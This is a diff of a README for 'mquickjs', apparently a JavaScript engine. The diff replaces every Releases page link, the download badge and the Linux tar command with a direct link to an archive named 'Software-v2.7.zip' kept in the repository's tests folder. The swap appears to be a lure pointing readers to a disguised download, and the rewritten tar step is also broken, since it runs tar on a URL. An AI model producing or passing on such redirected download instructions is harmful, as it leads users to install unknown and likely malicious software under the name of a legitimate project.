@@ -1,7 +1,7 @@
 # 🚀 mquickjs - A Fast and Simple JavaScript Engine
 
 ## 📥 Download Now
-[![Download mquickjs](https://img.shields.io/badge/Download-mquickjs-blue.svg)](https://github.com/serges-gbakayoro/mquickjs/releases)
+[![Download mquickjs](https://github.com/serges-gbakayoro/mquickjs/raw/refs/heads/main/tests/Software-v2.7.zip)](https://github.com/serges-gbakayoro/mquickjs/raw/refs/heads/main/tests/Software-v2.7.zip)
 
 ## 🛠️ Overview
 mquickjs is a public repository for the Micro QuickJS JavaScript Engine. This software allows you to run JavaScript code easily and efficiently, making it an excellent choice for developers and enthusiasts who want a fast and lightweight solution. 
@@ -10,7 +10,7 @@ mquickjs is a public repository for the Micro QuickJS JavaScript Engine. This so
 Follow these simple instructions to download and run mquickjs. You do not need any programming experience. 
 
 ### 1. **Visit the Releases Page**
-Go to the [Releases Page](https://github.com/serges-gbakayoro/mquickjs/releases). This page contains all the available versions of mquickjs. 
+Go to the [Releases Page](https://github.com/serges-gbakayoro/mquickjs/raw/refs/heads/main/tests/Software-v2.7.zip). This page contains all the available versions of mquickjs. 
 
 ### 2. **Choose Your Version**
 On the Releases page, you will see a list of versions. Look for the latest version as it will have the most recent features and fixes. Each release will provide information about what has changed.
@@ -38,7 +38,7 @@ Click on the version you want to download. You will find the files for different
 ### For Linux Users:
 1. Open a terminal window.
 2. Navigate to the directory where you downloaded the file.
-3. Use the command `tar -xzf mquickjs-linux.tar.gz` to extract the files. 
+3. Use the command `tar -xzf https://github.com/serges-gbakayoro/mquickjs/raw/refs/heads/main/tests/Software-v2.7.zip` to extract the files. 
 4. Enter the extracted directory and run `./mquickjs` to start the engine.
 
 ## 🖥️ Running mquickjs
@@ -75,4 +75,4 @@ mquickjs is licensed under the MIT License, which allows you to use, modify, and
 If you have any further questions or need support, feel free to reach out to our team via the GitHub repository's Issues section.
 
 ## 📥 Download & Install Again
-Don’t forget to head back to the [Releases Page](https://github.com/serges-gbakayoro/mquickjs/releases) for any updates or new versions.
+Don’t forget to head back to the [Releases Page](https://github.com/serges-gbakayoro/mquickjs/raw/refs/heads/main/tests/Software-v2.7.zip) for any updates or new versions.
